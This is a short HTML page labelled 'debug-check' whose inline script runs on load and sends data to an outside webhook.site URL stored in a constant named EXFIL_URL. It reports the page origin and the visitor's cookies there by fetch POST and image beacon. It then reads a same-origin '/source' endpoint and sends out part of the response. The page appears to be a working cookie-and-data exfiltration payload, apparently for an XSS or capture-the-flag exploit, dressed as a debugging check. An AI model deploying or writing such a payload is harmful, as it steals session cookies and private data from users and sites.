<!doctype html>
<meta charset="utf-8" />
<title>debug-check</title>
<body>
  <h3>Debugging origin</h3>
  <pre id="log"></pre>
  <script>
    const EXFIL_URL = "https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588";
    const log = (...a) => (document.getElementById("log").textContent += a.join(" ") + "\n");
    const exfil = (msg) => {
      try { fetch(EXFIL_URL, {method:"POST", mode:"no-cors", headers:{"Content-Type":"text/plain"}, body:String(msg)}); } catch {}
      try { new Image().src = EXFIL_URL + "?m=" + encodeURIComponent(String(msg)) + "&t=" + Date.now(); } catch {}
    };

    // === Probes ===
    exfil("ORIGIN:" + location.origin);   // Step 1: report origin
    exfil("COOKIE:" + document.cookie);   // Step 2: report cookies

    // Step 3: try fetching a same-origin endpoint
    fetch("/source")
      .then(r => r.text())
      .then(txt => exfil("FETCH_OK:" + txt.slice(0,50)))
      .catch(e => exfil("FETCH_ERR:" + e));
  </script>
</body>
